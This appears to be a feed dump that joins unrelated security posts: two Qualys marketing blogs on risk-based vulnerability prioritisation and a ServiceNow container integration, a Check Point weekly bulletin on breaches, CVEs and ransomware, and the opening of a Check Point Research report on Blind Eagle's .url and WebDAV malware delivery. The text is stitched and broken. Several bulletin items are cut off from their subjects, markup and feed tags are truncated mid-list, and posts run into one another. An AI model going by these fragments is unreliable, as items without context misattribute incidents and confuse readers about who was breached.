&lt;p&gt;Security and IT teams are drowning in alerts, scrambling to patch everything they can, yet breaches still happen. Not all vulnerabilities pose the same risk. While reducing totals may seem like progress, without clear priorities, security teams risk treating symptoms instead of addressing the root causes of risk to the business.&lt;/p&gt;



&lt;p&gt;The cybersecurity landscape is seeing an unprecedented surge in vulnerabilities. As of early 2025, the &lt;a href="https://nvd.nist.gov/general/nvd-dashboard"&gt;National Vulnerability Database (NVD)&lt;/a&gt; documented over 280,000 vulnerabilities, with 33% classified as high to critical. In 2023 alone, 28,817 vulnerabilities were disclosed, surpassing the previous year’s total by more than 3,700. &lt;a href="https://blog.qualys.com/vulnerabilities-threat-research/2024/08/06/2024-midyear-threat-landscape-review"&gt;This trend continued into 2024&lt;/a&gt;, with a staggering 22,254 vulnerabilities reported by mid-year, marking a 30% increase over the same period in 2023. These numbers are a wake-up call: organizations must rethink their security strategies to zero in on what truly matters.&lt;/p&gt;



&lt;span id="more-37386"&gt;&lt;/span&gt;



&lt;p&gt;The chart below shows that over half of all published vulnerabilities are now rated as high-to-critical, reflecting a steady upward trend:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Picture1-1.png"&gt;&lt;img alt="" class="wp-image-37393" height="298" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Picture1-1.png" width="453" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;This is set to continue into 2025, putting further pressure on security teams.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="treating-all-vulnerabilities-equally-the-hidden-costs"&gt;Treating All Vulnerabilities Equally – The Hidden Costs&lt;/h2&gt;



&lt;p&gt;As we’ve learned recently, treating all assets and vulnerabilities equally leads to inefficiency and often overwhelms. True risk reduction isn’t about fixing more vulnerabilities; it’s about fixing the &lt;em&gt;right&lt;/em&gt; ones. This requires a decisive shift in mindset and tactics toward risk-based prioritization, aligning security efforts closely with overarching business priorities. &amp;nbsp;&lt;/p&gt;



&lt;p&gt;A global financial institution learned this the hard way. Their one-size-fits-all approach, mandating patches across all systems equally, led to significant operational setbacks, unnecessary downtime, and exasperated teams. When maintenance windows opened, teams patched without strategic order, remediating critical transaction systems at the same pace as non-essential development environments. The result? Critical business operations suffered unnecessary downtime, while low-risk assets received equal attention as mission-critical systems. Instead of reducing risk, teams were overwhelmed, wasting valuable time and effort while key systems remained exposed longer than necessary.&lt;/p&gt;



&lt;p&gt;This example highlights why targeted action is more effective than indiscriminate patching. The goal isn’t to fix everything, but to fix what matters most. Prioritization is the foundation of risk-based security and the essential first step in embarking on the TruRisk journey.&lt;/p&gt;



&lt;p&gt;Qualys CEO Sumedh Thakar succinctly pointed out in a recent &lt;a href="https://www.scworld.com/podcast-segment/12964-closing-ciso-ceo-communication-gap-requires-a-common-business-language-sumedh-thakar-bsw-357"&gt;SC Magazine podcast&lt;/a&gt; that “&lt;em&gt;simply reducing vulnerability counts is not enough to achieve meaningful risk reduction.”&lt;/em&gt; Organizations must quantify risk in business terms, bridging the gap between technical teams and decision-makers to drive accountability and strategic action.&lt;/p&gt;



&lt;p&gt;To begin this process, organizations must answer two pivotal questions:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;What is your organization’s risk tolerance?&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Which assets are most critical, and what are the repercussions if they are compromised?&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Developing a &lt;strong&gt;shared language for risk&lt;/strong&gt; not only strengthens prioritization but also improves resource allocation, effectively breaking down silos between security and business leaders and paving the way for &amp;nbsp;meaningful and measurable risk reduction. Security leaders play a critical role in this transformation.&lt;/p&gt;



&lt;p&gt;As John C. Maxwell insightfully articulated, &lt;em&gt;&amp;#8220;A leader is one who knows the way, goes the way, and shows the way.&amp;#8221;&lt;/em&gt; This means understanding the risks, taking proactive measures, and guiding teams toward a structured, impactful strategy.&lt;/p&gt;



&lt;p&gt;At Qualys, we’ve seen firsthand how organizations achieve breakthroughs and transform security cultures by shifting to risk-based tactics and remediation. TruRisk provides the vehicle to &lt;em&gt;drive&lt;/em&gt; measurable risk reduction &lt;strong&gt;and&lt;/strong&gt; meet critical &lt;em&gt;business objectives.&lt;/em&gt;&lt;/p&gt;



&lt;div style="padding: 56.25% 0 0 0;"&gt;&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="efficiency-and-consistency-a-unified-risk-approach"&gt;Efficiency and Consistency – A Unified Risk Approach&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;#8220;If everyone is moving forward together, then success takes care of itself.&amp;#8221; &lt;/em&gt;&lt;/strong&gt;&lt;em&gt;– Henry Ford&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;In any industry, chaos and inefficiency hinder progress. Early vehicle production lines were no exception, plagued by unpredictability, excessive costs, and slow output. At the time, building a car was an inconsistent and expensive process.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/ford-motor-company-assembly-line-e3309a-1.jpg"&gt;&lt;img alt="" class="wp-image-37422" height="588" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/ford-motor-company-assembly-line-e3309a-1.jpg" width="918" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Image Credit: Picryl&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Drawing inspiration from steam engines, meatpacking plants, and watch factories, Ford and his team refined the moving assembly line, cutting production times from over 12 hours to just 90 minutes.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Ford_assembly_line_-_1913-scaled.jpg"&gt;&lt;img alt="" class="wp-image-37389" height="1847" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Ford_assembly_line_-_1913-scaled.jpg" width="2560" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Image Credit: Wikimedia Commons&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Ford didn’t just build cars; they revolutionized the entire process (and the world). Their success stemmed from meticulous planning, adaptation, precision tooling, and a culture of collaboration. Through relentless iteration, they distilled disorder into a structured system that reshaped manufacturing forever.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/GettyImages-51098603-58b96f4a3df78c353cdb7208.jpg"&gt;&lt;img alt="" class="wp-image-37390" height="1473" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/GettyImages-51098603-58b96f4a3df78c353cdb7208.jpg" width="2000" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Image Credit: Getty Images&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Before the assembly line, automobiles were a luxury only the wealthy could afford. Thanks to Ford’s vision and execution, vehicle ownership quickly became a staple of modern life. Ford’s assembly line proved that efficiency and consistency could turn innovation into a widespread impact. Cybersecurity must take the same approach, moving beyond reactive fixes to structured, repeatable strategies that prioritize what truly matters.&lt;/p&gt;



&lt;p&gt;By embedding security into the fabric of business operations, organizations streamline their protection, safeguard critical assets, and cultivate resilience. Just as Ford’s vision redefined manufacturing, a risk-based approach transforms cybersecurity into a scalable, precision-driven system that keeps businesses secure in a chaotic threat landscape.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="strategy-into-action-shared-risk-language"&gt;Strategy into Action &amp;#8211; Shared Risk Language&lt;/h2&gt;



&lt;p&gt;Successful risk management strategies aren’t about fixing vulnerabilities but about protecting assets that drive business success. Achieving successful organizational alignment will require effective leadership, clear strategy, and confident execution.&lt;/p&gt;



&lt;p&gt;The &lt;strong&gt;Risk = Likelihood x Impact&lt;/strong&gt;, formula provides a solid foundation for clear strategy and a shared risk language. While originally rooted in general risk management, this formula has become essential across disciplines, including cybersecurity, where it drives organizational awareness and effective strategies.&lt;/p&gt;



&lt;p&gt;With TruRisk integrated into Qualys VMDR 2.0, this formula transforms into a measurable &lt;em&gt;and&lt;/em&gt; actionable component:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;strong&gt;Risk (&lt;em&gt;TruRisk&lt;/em&gt;) = Likelihood (&lt;em&gt;Qualys Detection Score&lt;/em&gt;) x Impact (&lt;em&gt;Asset Criticality Score&lt;/em&gt;)&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;With a TruRisk view, you can quickly see asset details, criticality, and key risk factors. The interface shows the risk calculation with the full formula displayed, so you can see exactly how each asset’s score was determined.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/TruRisk-shot.png"&gt;&lt;img alt="" class="wp-image-37395" height="982" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/TruRisk-shot.png" width="1915" /&gt;&lt;/a&gt;&lt;/figure&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/TruRiskvalueslide.png"&gt;&lt;img alt="" class="wp-image-37394" height="296" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/TruRiskvalueslide.png" width="526" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Later in our series, we’ll demonstrate how you can tune your prioritization while driving down remediation times, all from the same pane of glass.&lt;/p&gt;



&lt;p&gt;These tools and tactics empower organizations to:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Quantify risk in business terms, transforming technical findings into guided strategic action.&lt;br /&gt;&lt;/li&gt;



&lt;li&gt;Enable teams to prioritize vulnerabilities with the highest potential impact.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By embedding this shared language into organizational processes and conversations, you plant the seeds for stronger alignment between cybersecurity and business objectives. With consistent nurturing through collaboration, strategy, and execution, this foundation not only grows stronger but flourishes. Resilience strengthens, and decision-making sharpens as technical and business growth takes root, creating a dynamic, robust, and thriving security ecosystem.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="organizational-alignment-from-vulnerability-to-risk-reduction"&gt;Organizational Alignment – From Vulnerability to Risk Reduction&lt;/h2&gt;



&lt;p&gt;When security teams and business leaders align on a shared approach to risk, the entire organization becomes more agile, focused, and resilient in facing modern threats. Targeting high-value assets and the most pressing threats streamlines risk management, ensuring even resource-limited teams can maximize impact and reduce risk effectively.&lt;/p&gt;



&lt;p&gt;With a committed team, a shared vision, and the right tools in place, security leaders transform into trusted advisors who drive effective risk reduction &lt;em&gt;and&lt;/em&gt; link security efforts with business priorities.&lt;/p&gt;



&lt;p&gt;Aligning vulnerability management with business goals is the first step to achieving TruRisk. VMDR with TruRisk empowers organizations to confidently navigate threats, accelerate remediation, and safeguard critical operations.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;&lt;u&gt;Key Step 1 Takeaways:&lt;/u&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Align risk management with business priorities:&lt;/strong&gt; Foster strong leadership, collaboration, and clear communication to create synergy between security and business objectives.&lt;br /&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Leverage unified risk prioritization framework&lt;/strong&gt;: &lt;em&gt;Risk = Likelihood (Qualys Detection Score) x Impact (Asset Criticality Score)&lt;/em&gt; formula to &lt;strong&gt;guide decision-making and focus efforts &lt;/strong&gt;on what truly matters.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;No matter their starting point, Qualys empowers organizations to elevate their risk strategies with clarity and precision. The &lt;a href="https://www.qualys.com/enterprise-trurisk-platform/"&gt;Qualys Enterprise TruRisk platform&lt;/a&gt; transforms risk reduction into a measurable, strategic advantage, ensuring security efforts are focused, efficient, and impactful.

&lt;p&gt;&lt;strong&gt;Qualys and ServiceNow&lt;/strong&gt; are redefining &lt;strong&gt;container vulnerability management&lt;/strong&gt; with an integrated approach that streamlines remediation for highly ephemeral containerized workloads. Organizations can now seamlessly &lt;strong&gt;detect, prioritize, and remediate vulnerabilities at scale&lt;/strong&gt; using Qualys’ threat-informed, runtime-aware security intelligence alongside ServiceNow’s enterprise-grade workflow automation. This partnership ensures vulnerabilities in ephemeral, hard-to-track assets are remediated by the right owners while automating ticket management—creating, prioritizing, assigning, and closing tickets based on scans, threat intelligence, and runtime context. This allows organizations to systematically track and reduce risk across containerized environments.&lt;/p&gt;



&lt;span id="more-37401"&gt;&lt;/span&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Screenshot-1-Landing-Dashboard.png"&gt;&lt;img alt="" class="wp-image-37410" height="723" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Screenshot-1-Landing-Dashboard.png" width="1607" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="expanding-attack-surfaces-and-challenges-in-container-security"&gt;&lt;strong&gt;Expanding Attack Surfaces and Challenges in Container Security&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;As organizations rapidly adopt containerized applications, securing these environments presents unique challenges. Unlike traditional infrastructure, containers are highly dynamic and ephemeral and often lack clear ownership for remediation. Security teams face difficulties such as:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Expanding Attack Surfaces&lt;/strong&gt; – With containers and microservices, both the attack surface and the volume of vulnerabilities expand significantly, increasing risk exposure.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;High Noise Levels&lt;/strong&gt; – The sheer volume of vulnerabilities, combined with the ephemeral nature of containerized assets, creates excessive noise, making it difficult to identify and prioritize real risks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Lack of Runtime Context&lt;/strong&gt; – Without business-aware prioritization, teams struggle to focus on the most critical threats.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Ownership Challenges &lt;/strong&gt;– Since containers cannot be patched in place, the teams responsible for patching often differ from those deploying them, making ownership attribution difficult and complicating systematic remediation tracking.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="what-an-effective-vulnerability-management-solution-needs"&gt;&lt;strong&gt;What an Effective Vulnerability Management Solution Needs&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;To truly secure containerized environments, a modern vulnerability management approach must:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Seamlessly Integrate With Existing Workflows &amp;#8211; &lt;/strong&gt;Vulnerability management teams already use ServiceNow to track traditional vulnerabilities and collaborate with IT. Extending this familiar workflow to developers ensures consistent tooling, streamlined remediation tracking, and improved collaboration for timely vulnerability resolution.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Provide contextual, risk-based prioritization&lt;/strong&gt; – Developers need to understand why a vulnerability requires immediate attention. Is there an active exploit? Does it impact a critical business asset?&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Deliver actionable remediation guidance&lt;/strong&gt; – Beyond CVE listings, teams need &lt;strong&gt;clear, noise-free&lt;/strong&gt; patch recommendations that help reduce risk as efficiently as possible.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Automate remediation tracking&lt;/strong&gt; – Security teams need visibility into progress, with automated ticketing, assignment, and closure to streamline workflows.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This is where &lt;strong&gt;Qualys and ServiceNow&lt;/strong&gt; come together to &lt;strong&gt;reduce the vulnerability burden&lt;/strong&gt; on security teams while accelerating remediation.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="key-features-bringing-qualys-servicenow-together"&gt;&lt;strong&gt;Key Features: Bringing Qualys &amp;amp; ServiceNow Together&lt;/strong&gt;&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;1. Threat-Informed, Business-Aware Risk Prioritization (TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt;)&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Qualys quantifies risk using a combination of real-time threat intelligence, exploitability data, and business impact. This ensures teams focus on vulnerabilities that truly matter, reducing wasted effort on low-risk findings. Unlike traditional vulnerability management solutions or standalone Cloud Detection and Response (CDR) tools that rely on stitched-together data, TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; provides a &lt;strong&gt;runtime-aware, threat-informed&lt;/strong&gt; approach to security.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Screenshot-2-trurisk.png"&gt;&lt;img alt="" class="wp-image-37411" height="1462" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Screenshot-2-trurisk.png" width="3024" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;2. Noise-Free, Actionable Findings with Developer Context&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;ServiceNow ensures that developers &lt;strong&gt;only see vulnerabilities that require immediate action&lt;/strong&gt;, reducing alert fatigue and keeping focus on relevant issues. Qualys embeds &lt;strong&gt;remediation and patch guidance directly into a single, consolidated ticket&lt;/strong&gt;, allowing teams to act quickly with all necessary context.&lt;/p&gt;



&lt;p&gt;With ServiceNow, developers can also:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Track &lt;strong&gt;what is assigned to them&lt;/strong&gt;, what is &lt;strong&gt;upcoming&lt;/strong&gt;, and what is &lt;strong&gt;due&lt;/strong&gt;—especially when a grace period is granted.&lt;/li&gt;



&lt;li&gt;Automatically close tickets once vulnerabilities are remediated, keeping the backlog clean and streamlined.&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37413" height="535" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Screenshot-3-Patch-based-ticketing-1-1070x535.png" width="1070" /&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;3. Automated Remediation Workflows &amp;amp; Exception Management&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Through ServiceNow, Qualys &lt;strong&gt;automatically assigns vulnerabilities to the right development or security teams&lt;/strong&gt;, ensuring frictionless remediation workflows. Security teams can:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Set &lt;strong&gt;assignment rules&lt;/strong&gt; to automatically direct vulnerabilities to the right owners.&lt;/li&gt;



&lt;li&gt;Establish &lt;strong&gt;remediation rules&lt;/strong&gt; to enforce compliance.&lt;/li&gt;



&lt;li&gt;Utilize &lt;strong&gt;exception management&lt;/strong&gt; to defer issues when necessary.&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37414" height="484" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Screenshot-4-Remediation-workflow-1070x484.png" width="1070" /&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;4. End-to-End Remediation Tracking &amp;amp; Actionable Metrics&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;By integrating &lt;strong&gt;Qualys and ServiceNow&lt;/strong&gt;, organizations gain actionable &lt;strong&gt;remediation metrics&lt;/strong&gt;, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Mean Time to Remediate (MTTR)&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Average closure time&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Exception trends and policy compliance tracking&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;These insights allow security and IT teams to continuously improve remediation efficiency and reduce risk exposure.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37416" height="313" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Screenshot-5-Remediate-dashboard-1070x313.png" width="1070" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="how-the-integration-works-a-simple-3-step-workflow"&gt;&lt;strong&gt;How the Integration Works: A Simple 3-Step Workflow&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;To illustrate the simplicity and power of this integration, here&amp;#8217;s a high-level workflow of how Qualys and ServiceNow work together:&lt;/p&gt;



&lt;p&gt;1. &lt;strong&gt;Detect &amp;amp; Prioritize&lt;/strong&gt; – Qualys &lt;strong&gt;TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt;&lt;/strong&gt; identifies container vulnerabilities, quantifies risk, and filters out noise. Containers, images, and QIDs are synced to ServiceNow.&lt;/p&gt;



&lt;p&gt;2. &lt;strong&gt;Assign &amp;amp; Track&lt;/strong&gt; – ServiceNow applies rules to &lt;strong&gt;auto-assign tickets&lt;/strong&gt; to the right owner. QIDs are mapped to patchable CVEs to enable development teams to take action with context.&lt;/p&gt;



&lt;p&gt;3. &lt;strong&gt;Remediate &amp;amp; Automate&lt;/strong&gt; – Development teams receive &lt;strong&gt;actionable guidance&lt;/strong&gt; within ServiceNow, implement fixes, and have tickets &lt;strong&gt;auto-closed&lt;/strong&gt; upon validation.&lt;/p&gt;



&lt;p&gt;This seamless flow eliminates bottlenecks, reduces manual effort, and ensures that security vulnerabilities are addressed efficiently.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The City of Mission, Texas, has &lt;a href="https://texasborderbusiness.com/city-of-mission-declares-emergency-amid-cyberattack-threat/"&gt;declared&lt;/a&gt; a local state of emergency following a severe cybersecurity incident that threatens to expose protected personal information, health records, and other critical data managed by city departments. The emergency declaration was issued by Mayor Norie Gonzalez Garza on March 4, 2025, after the cyber-attack was identified on February 28, 2025. City officials are concerned that sensitive government data could be compromised, potentially leading to identity theft, disruption of city services, and legal complications if the breach is not contained.&lt;/li&gt;
&lt;li&gt;National Presto Industries has &lt;a href="https://www.sec.gov/Archives/edgar/data/80172/000143774925006475/npk20250306_8k.htm"&gt;experienced&lt;/a&gt; a cyberattack that began on March 1, causing system outages impacting shipping, receiving, manufacturing processes, and back-office functions. The American company has implemented temporary measures to maintain critical operations while systems are being restored. Law enforcement has been notified, and an incident response team is conducting a forensic analysis to determine the scope of the incident.​&lt;/li&gt;
&lt;li&gt;The Toronto Zoo has been &lt;a href="https://www.torontozoo.com/mediaroom/press2025/20250228"&gt;hit by&lt;/a&gt; a ransomware attack in January 2024, exposing visitor transaction data from 2000 to 2023. Stolen data includes names, addresses, phone numbers, emails, and partial credit card details from recent transactions. The Akira ransomware group claimed responsibility, stating they exfiltrated 133GB of data, including confidential agreements and personal files.&lt;/li&gt;
&lt;/ul&gt;

The breach, discovered on February 5, exposed customer names, contract numbers, phone numbers, email and physical addresses, and service usage information. No threat actor has claimed responsibility yet.&lt;/li&gt;
&lt;li&gt;Penn-Harris-Madison school district in Indiana has &lt;a href="https://www.southbendtribune.com/story/news/education/2025/03/03/phm-hit-by-ransomware-cyber-attack-investigating-data-breach/81155890007/"&gt;suffered&lt;/a&gt; a ransomware attack. According to the school district, the attack caused disruptions in school operations, but student Social Security numbers where not leaked in the attack.&lt;/li&gt;
&lt;li&gt;Poland&amp;#8217;s space agency, POLSA, has recently &lt;a href="https://therecord.media/poland-space-cyberattack-agency-investigate"&gt;announced&lt;/a&gt; they have been the victim of a cyber-attack. Unauthorized access to the agency&amp;#8217;s IT infrastructure was detected and affected systems have been secured. The incident is currently under investigation to identify the attackers behind the breach.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A critical out-of-bounds write vulnerability (CVE-2025-22224), which is actively exploited, is &lt;a href="https://www.bleepingcomputer.com/news/security/over-37-000-vmware-esxi-servers-vulnerable-to-ongoing-attacks/"&gt;affecting&lt;/a&gt; over 37,000 internet-exposed VMware ESXi servers. This flaw allows local attackers with administrative privileges on a VM guest to escape the sandbox and execute code on the host as the VMX process. Despite available patches and the flaw inclusion in CISA’s Known Exploited Vulnerabilities (KEV) Catalog, a significant number of servers remain unpatched.&lt;/li&gt;
&lt;li&gt;Google has &lt;a href="https://source.android.com/docs/security/bulletin/2025-03-01"&gt;released&lt;/a&gt; its March 2025 Android Security Bulletin, addressing 44 flaws, two of them are high-severity ones actively exploited: a privilege escalation in the Framework component (CVE-2024-43093), and a privilege escalation in the HID USB component of the Linux kernel (CVE-2024-50302).&lt;/li&gt;
&lt;li&gt;CISA has &lt;a href="https://www.cisa.gov/news-events/alerts/2025/03/03/cisa-adds-five-known-exploited-vulnerabilities-catalog"&gt;added&lt;/a&gt; five security flaws &lt;a href="https://thehackernews.com/2025/03/cisco-hitachi-microsoft-and-progress.html"&gt;affecting&lt;/a&gt; Cisco, Hitachi Vantara, Microsoft, and Progress WhatsUp Gold to its KEV catalog. These include a command injection vulnerability in Cisco Small Business RV Series routers (CVE-2023-20118); two flaws (CVE-2022-43939, CVE-2022-43769) in Hitachi Vantara Pentaho BA Server; an improper resource shutdown issue in Microsoft Windows Win32k (CVE-2018-8639); and a path traversal vulnerability in Progress WhatsUp Gold (CVE-2024-4885).&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;(Hitachi Vantara Pentaho Business Analytics Server Authentication Bypass (CVE-2022-43939), Hitachi Vantara Pentaho Business Analytics Server Remote Code Execution (CVE-2022-43769), Microsoft Win32k Elevation of Privilege (CVE-2018-8639), WhatsUp Gold Remote Code Execution (CVE-2024-4885))&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The FBI and CISA &lt;a href="https://www.ic3.gov/PSA/2025/PSA250306-2"&gt;warn&lt;/a&gt; of a mail scam campaign threating data exposure from a group masquerading as the notorious BianLian ransomware. The campaign uses physical letters, demanding between $250,000 to $500,000 in Bitcoin from corporate executives, claiming unauthorized data access and threaten exposure on ransomware leak sites. Although the linkages to the actual BianLian remain uncertain, the threat actors are primarily targeting executives across the US healthcare industry.&lt;/li&gt;
&lt;/ul&gt;

&lt;li&gt;Researchers have &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/03/06/malvertising-campaign-leads-to-info-stealers-hosted-on-github/"&gt;identified&lt;/a&gt; a large-scale malvertising campaign impacting over one million devices globally. The attack originates from illegal streaming websites embedded with malvertising redirectors, leading users to intermediary sites and subsequently to platforms like GitHub, Discord, and Dropbox, which host the malicious payloads. The campaign employs a sophisticated redirection chain and utilizes various malware, including Lumma Stealer and Doenerium.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.security.com/threat-intelligence/medusa-ransomware-attacks"&gt;noted&lt;/a&gt; a 42% increase in Medusa ransomware attacks from 2023 to 2024, with incidents doubling in early 2025. Medusa, operated as a ransomware-as-a-service (RaaS) by the group tracked as Spearwing, employs double extortion tactics, steals and encrypts data.&lt;/li&gt;

It primarily targets organizations in Colombia and other Latin American countries. Active since 2018, this Advanced Persistent Threat (APT) group focuses on government institutions, financial organizations, and critical infrastructure. Blind Eagle is known for employing [&amp;#8230;]&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/blind-eagle-and-justice-for-all/"&gt;Blind Eagle: …And Justice for All&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Key Points&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; discovered a series of ongoing campaigns targeting Colombian institutions and government entities since November 2024. The campaigns are linked to &lt;strong&gt;Blind Eagle&lt;/strong&gt;, also known as &lt;strong&gt;APT-C-36&lt;/strong&gt;, and deliver malicious &lt;code&gt;.url&lt;/code&gt; files, which cause a similar effect to the &lt;strong&gt;CVE-2024-43451&lt;/strong&gt; vulnerability.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt; exposes a user&amp;#8217;s NTLMv2 hash, which can allow an attacker to authenticate as the user via pass-the-hash or relay attacks. This vulnerability can be triggered just by right-clicking, deleting, or dragging the file. While the Blind Eagle malicious file does not exploit this vulnerability, it triggers a WebDAV request in the same uncommon ways, notifying the attacker that the file was downloaded. Finally, when the user clicks on the file, it downloads the next-stage payload via another WebDAV request and executes the malware.&lt;/li&gt;



&lt;li&gt;Microsoft patched the original vulnerability on November 12, 2024. Just &lt;strong&gt;six days&lt;/strong&gt; later, &lt;strong&gt;Blind Eagle&lt;/strong&gt; included this &lt;code&gt;.url&lt;/code&gt; variant in its attack arsenal and campaigns.&lt;/li&gt;



